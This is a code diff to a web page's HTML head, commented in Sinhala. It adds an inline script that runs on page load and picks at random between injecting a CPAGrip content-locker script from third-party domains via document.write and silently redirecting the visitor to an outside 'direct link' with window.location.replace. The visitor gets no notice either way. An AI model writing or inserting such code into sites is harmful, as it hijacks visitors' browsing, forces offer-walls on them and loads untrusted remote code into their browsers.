@@ -8,20 +8,32 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght=400;500;600;700;800&display=swap" rel="stylesheet">
     
     <script type="text/javascript">
-        // CPAGrip ලොකර් ස්ක්‍රිප්ට් 3 මෙතන තියෙනවා
+        // 1. මෙතන තියෙන්නේ CPAGrip Script ලින්ක්ස් විතරයි
         const trackingScripts = [
             "https://squaredownloads.com/script_include.php?id=1897979",
-            "https://squaredownloads.com/script_include.php?id=1897986",
+           
             "https://installfebruary.com/script_include.php?id=1897987"
         ];
 
-        // Random එකක් තෝරාගැනීම
-        const randomScript = trackingScripts[Math.floor(Math.random() * trackingScripts.length)];
+        // 2. මෙතන තියෙන්නේ ඩිරෙක්ට් ලින්ක්ස් විතරයි (ඔයාගේ අලුත් ලින්ක් එක මෙතනට දැම්මා)
+        const directLinks = [
+            "https://appsave.space/cl/i/rne9mk"
+        ];
 
-        // බ්‍රවුසර් එක පේජ් එක ලෝඩ් කරන ගමන්ම ස්ක්‍රිප්ට් එක HTML එකට කෙලින්ම ලියනවා (Inline Injection)
-        document.write('<script type="text/javascript" src="' + randomScript + '"><\/script>');
-        
-        console.log("CPAGrip Active Locker Node: " + randomScript);
+        // ඔක්කොම ලින්ක්ස් ටික එකතු කරලා Random එකක් තෝරනවා
+        const allNodes = [...trackingScripts, ...directLinks];
+        const selectedNode = allNodes[Math.floor(Math.random() * allNodes.length)];
+
+        // තේරුණු ලින්ක් එක ඩිරෙක්ට් ලින්ක් එකක්ද නැද්ද කියලා චෙක් කරනවා
+        if (directLinks.includes(selectedNode)) {
+            console.log("Direct Link Redirect Active: " + selectedNode);
+            // ඩිරෙක්ට් ලින්ක් එකක් නම්, පේජ් එක ලෝඩ් වෙනකොටම ඒකට රීඩිරෙක්ට් කරනවා
+            window.location.replace(selectedNode);
+        } else {
+            console.log("CPAGrip Active Locker Node: " + selectedNode);
+            // CPA Grip ස්ක්‍රිප්ට් එකක් නම් විතරක් HTML එකට ඉන්ජෙක්ට් කරනවා
+            document.write('<script type="text/javascript" src="' + selectedNode + '"><\/script>');
+        }
     </script>
 
     <style>
